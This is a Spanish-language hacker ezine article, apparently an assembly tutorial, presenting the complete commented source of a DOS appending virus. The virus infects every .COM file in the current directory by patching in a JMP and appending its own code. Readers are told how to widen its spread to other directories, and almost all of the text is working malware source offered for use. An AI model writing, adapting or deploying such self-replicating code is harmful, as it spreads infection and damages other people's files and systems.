+En esta segunda rutina vamos a hacer que el virus se copie pero sin
+sobreescribir, de manera que aunque infectemos un programa este seguira
+funcionando. Lo que hara el virus al infectar sera lo siguiente: mueve los 3
+primeros bytes del programa al final del programa y en su lugar pone un JMP
+al virus. Luego copia el virus al final del programa y cuando este termina
+de ejecutarse restaura los 3 bytes originales y hace un JMP al principio para
+que se ejecute el programa normalmente.
+Ya que a todos los archivos que infectemos tendran un JMP al principio
+utilizaremos ese JMP para marcar los archivos como infectados.
+Como la anterior rutina, esta, tambien infecta en el mismo directorio
+aunque lo podeis cambiar en la definicion "tipo" para que infecte en otros
+directorios. 
+Aqui teneis el codigo de la rutina comentado:
+
+-------------------------------COMIENZA CODIGO---------------------------------
+
+<++> DP4/CODIGO/asm_viri2.asm
+
+false:               
+                     jmp start
+                     int 20h
+
+;ponemos un JMP para marcar al archivo como infectado. Hay que darse cuenta
+;que cada vez que infectemos un archivo le pondremos un JMP al principio
+;asi que eso lo utilizaremos para saber si esta infectado. Como este ya esta,
+;porque es el virus!!, pues se lo ponemos. ;)
+
+start:               
+                     push bp
+                     call trampa
+
+;ahora metemos en la pila BP. Luego hacemos un CALL. La razon de hacer el CALL
+;es esta: al hacer un CALL a algun offset, el CALL almacena en la pila el
+;tama¤o total del programa. Esto nos sirve para evitar que las variables del
+;virus aparezcan corridas
+
+trampa:                
+                     pop bp
+                     sub bp,offset trampa
+
+;guardamos en BP lo que introdujo la instruccion CALL, que es el tama¤o del
+;programa. Luego le restamos al tama¤o del programa el propio virus y asi
+;sabemos el tama¤o del programa original
+                     
+                     push ds
+                     push es
+                     push ax
+                     push bx
+                     push cx
+                     push dx
+                     push di
+                     push si
+
+                     push cs
+                     push cs
+                     pop ds
+                     pop es
+
+;metemos todos los registros en la pila. Metemos dos veces lo que hay en CS
+;y luego los sacamos a DS y ES, de esta manera DS y ES adquieren el valor que
+;hay en CS
+                     
+                     mov cx,3d
+                     mov di,100h
+                     lea si,[bp+origen]
+                     cld
+                     rep movsb
+
+;aqui metemos en CX el valor 3, ya que son 3 los bytes que queremos mover.
+;Apuntamos desde donde queremos empezar a copiar y luego a donde queremos
+;copiar. Con CLD indicamos que el movimiento va a ser hacia delante y con
+;REP MOVSB le decimos que repita el moviemiento de un byte las veces que diga
+;CX, que son 3, por lo tanto movemos 3 bytes que es lo que ocupa el JMP
+                     
+                     mov ah,4eh                     
+                     lea dx,[bp+tipo]
+
+;funcion de buscar archivo y luego apuntamos a donde definimos el tipo de
+;archivo. Fijaos como siempre le sumamos BP
+                    
+buscarabrir:
+                     int 21h
+                     jc final
+
+;comienza a buscar y sino encuentra ninguno salta al final, si lo encuentra
+;sigue adelante
+         
+                     mov ax,3d00h                  
+                     mov dx,9eh                     
+                     int 21h
+
+;abrimos el archivo para lectura. En DX ponemos esa direccion para se¤alar que
+;queremos leer ek nombre del archivo. En el DTA se guardan datos sobre el
+;archivo encontrado. El DTA es parte del PSP y empieza en el offset 80h
+;OFFSET           BYTES OCUPADOS        FUNCION
+;00h              21d                   Usado por el dos para la funcion 4f
+;15h              01d                   Atributos del archivo encontrado
+;16h              02d                   Hora del archivo
+;18h              02d                   Fecha del archivo
+;1Ah              04d                   Tama¤o del archivo en bytes
+;1Eh              13d                   Nombre del archivo
+;Nosotros queremos el nombre, pero como el DTA empieza en el offset 80h hay
+;que poner  80h+1Eh= 9Eh 
+
+                     xchg bx,ax
+
+;guardamos el handel 
+
+                     mov ax,4200h                   
+                     mov cx,0000h               
+                     mov dx,0000h     
+                     int 21h
+
+;movemos el puntero al principio
+
+                     mov ah,3fh
+                     mov cx,3h
+                     lea dx,[bp+origen]
+                     int 21h 
+
+;aqui metemos en la variable origen los 3 primeros bytes del programa. En AH
+;funcion de lectura y en CX longitud a copiar
+
+                     mov ah,3eh                    
+                     int 21h
+
+;cerramos el archivo
+
+                     cmp byte ptr [bp+origen],0e9h
+                     jc buscarabrir             
+
+;comparamos si en la variable origen esta la funcion e9h (que es un JMP). Esto
+;lo hacemos para saber si el archivo esta infectado ya y si lo estuviera
+;saltaria a buscarabrir para buscar otro archivo, y si no es igual significa
+;que aun no esta infectado asi que sigue
+
+                     mov ax,3d02h
+                     mov dx,9eh
+                     int 21h
+                     mov word ptr ds:[bp+handle],ax
+                     xchg bx,ax
+
+;abro el archivo para lectura/escritura. Guardamos el handel en AX y en BX
+;metemos el handel
+
+                     mov cx,3h
+                     mov si,9ah
+                     lea di,[bp+cabecera+1]
+                     rep movsb
+
+;ahora hallamos el tama¤o del archivo y lo cojemos del DTA como ya hicimos
+;con el nombre
+                     
+                     sub word ptr [bp+cabecera+1],3
+
+;le restamos al tama¤o del archivo 3 bytes que son los que ocupa el JMP
+
+                     mov ax,4200h
+                     mov cx,0000h
+                     mov dx,0000h
+                     int 21h
+
+;movemos el puntero al principio
+
+                     mov ah,40h
+                     mov cx,3h
+                     lea dx,[bp+cabecera]
+                     int 21h
+
+;ahora copiamos la direccion hallada a la variable cabecera en la que tenemos
+;definida la funcion E9h (JMP)
+
+                     mov ax,4202h
+                     mov cx,0000h
+                     mov dx,0000h
+                     int 21h
+
+;movemos el puntero al final
+
+                     mov ah,40h
+                     mov cx,longitud
+                     lea dx,[bp+start]
+                     int 21h
+
+;copiamos el virus completo. En CX metemos la longitud del virus que esta
+;definido en la variable longitud. Al final del virus estan todas las
+;variables
+
+                     mov ah,3eh
+                     int 21h
+
+;cierro el archivo
+
+                     mov ah,4fh
+                     jmp buscarabrir
+
+;funcion de buscar otro y saltamos a buscarabrir
+
+final:
+                     pop si
+                     pop di
+                     pop dx
+                     pop cx
+                     pop bx
+                     pop ax
+                     pop bp
+
+                     mov ax,100h
+                     jmp ax
+
+;sacamos todo lo que merimos en la pila al principio y saltamos al principio
+;para que se ejecute el programa
+
+tipo db          '*.COM',0                          
+origen db 090h,090h,090h
+handle dw 0
+cabecera db 0e9h,00h,00h
+theend   label near
+longitud         equ  theend-start
+
+;aqui definimos todas las variables
+
+<-->
+-------------------------------FINAL DEL CODIGO-------------------------------
+
+Parace que esto se ha acabado... y ya no os doy mas la brasa con ASM xDDD
+Dudas, sugerencias, criticas o lo que sea, ya sabeis, mail a la direccion del
+ezine o bien a la mia.
+Pos na mas... nos vemos en el proximo... talueK!
+
+S_K
